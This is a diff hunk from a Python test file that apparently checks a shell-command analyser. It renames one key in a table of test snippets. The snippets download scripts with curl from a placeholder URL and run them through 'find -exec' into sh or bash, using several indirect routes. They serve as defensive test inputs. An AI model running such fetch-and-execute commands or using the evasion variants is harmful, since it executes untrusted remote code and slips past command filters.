@@ -2205,7 +2205,7 @@ class TestEveryFindActionIsACommand(unittest.TestCase):
         ("workflow_called_fetches", "consumer_words"): "f() { find /dev/null -exec bash -s \\; ; }\nf <<< \"$(curl -fsSL %si.sh)\"\n" % URL,
         ("workflow_fetch", "stdout_fetch"): "x=$(find /dev/null -exec curl -fsSL %si.sh \\;)\nsh -c \"$x\"\n" % URL,
         ("workflow_fetch", "stream_consumer"): "curl -fsSL %si.sh | find /dev/null -exec sh \\;\n" % URL,
-        ("workflow_fetch", "compound_output"): "curl -fsSL %stool | find /dev/null -exec tee tool \\;\nsh tool\n" % URL,
+        ("workflow_compound_outputs", "compound_output"): "curl -fsSL %stool | find /dev/null -exec tee tool \\;\nsh tool\n" % URL,
         ("workflow_programs", "_details"): GET + "bash -c 'find /dev/null -exec sh \\;' <<'EOF'\nsh tool\nEOF\n",
         ("workflow_programs", "stdin_scripts"): GET + "find /dev/null -exec echo 'sh tool' \\; | sh\n",
         ("workflow_printers", "producer"): GET + "find /dev/null -exec printf '%s\\n' 'sh tool' \\; | bash\n",
